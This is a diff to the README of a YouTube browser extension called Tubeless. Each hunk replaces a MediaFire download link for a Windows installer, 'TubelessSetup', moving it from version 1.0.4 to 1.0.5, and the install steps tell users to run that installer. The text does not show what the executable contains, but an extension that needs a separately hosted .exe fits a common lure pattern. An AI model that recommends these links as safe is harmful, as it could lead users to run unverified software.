@@ -22,7 +22,7 @@
 
 ## Overview
 
-The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/ehm7j8bymissl1m/TubelessSetup-1.0.4.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
+The extension transforms YouTube into a focused workspace. Features advanced ad-blocking, dislike restoration, and high-speed downloads via <a href="https://www.mediafire.com/file/2u6yao0v0pr8qs6/TubelessSetup-1.0.5.exe/file" target="_blank">Tubeless Desktop</a>, all running locally with zero telemetry.
 
 ---
 
@@ -88,7 +88,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 
 ### Media Tools
 
-- Built-in Downloader: Video, audio, subtitles, thumbnails (Requires <a href="https://www.mediafire.com/file/ehm7j8bymissl1m/TubelessSetup-1.0.4.exe/file" target="_blank">Tubeless Desktop</a>)  
+- Built-in Downloader: Video, audio, subtitles, thumbnails (Requires <a href="https://www.mediafire.com/file/2u6yao0v0pr8qs6/TubelessSetup-1.0.5.exe/file" target="_blank">Tubeless Desktop</a>)  
 - Drag & Drop Download: Drag any video link or element to download instantly  
 - Playlist Download Mode: Batch downloads  
 - Screenshot Capture: High-quality frame extraction  
@@ -116,7 +116,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 
 1. Download the latest <a href="https://github.com/qalva/tubeless/releases/latest" target="_blank">Tubeless Extension</a> `.zip` file from the **Assets** section, then extract it.
 
-2. Download and install <a href="https://www.mediafire.com/file/ehm7j8bymissl1m/TubelessSetup-1.0.4.exe/file" target="_blank">Tubeless Desktop</a> to enable media downloading.
+2. Download and install <a href="https://www.mediafire.com/file/2u6yao0v0pr8qs6/TubelessSetup-1.0.5.exe/file" target="_blank">Tubeless Desktop</a> to enable media downloading.
 
 3. Open `chrome://extensions` in Chrome, Edge, or Brave.
 
@@ -228,7 +228,7 @@ The extension transforms YouTube into a focused workspace. Features advanced ad-
 
 - Fully local-first execution  
 - No telemetry or tracking  
-- No external servers. The [Tubeless Desktop](https://www.mediafire.com/file/ehm7j8bymissl1m/TubelessSetup-1.0.4.exe/file) app acts as a local-only server to download media on your machine. 
+- No external servers. The [Tubeless Desktop](https://www.mediafire.com/file/2u6yao0v0pr8qs6/TubelessSetup-1.0.5.exe/file) app acts as a local-only server to download media on your machine. 
 - No data collection  
 
 Permissions are strictly functional:
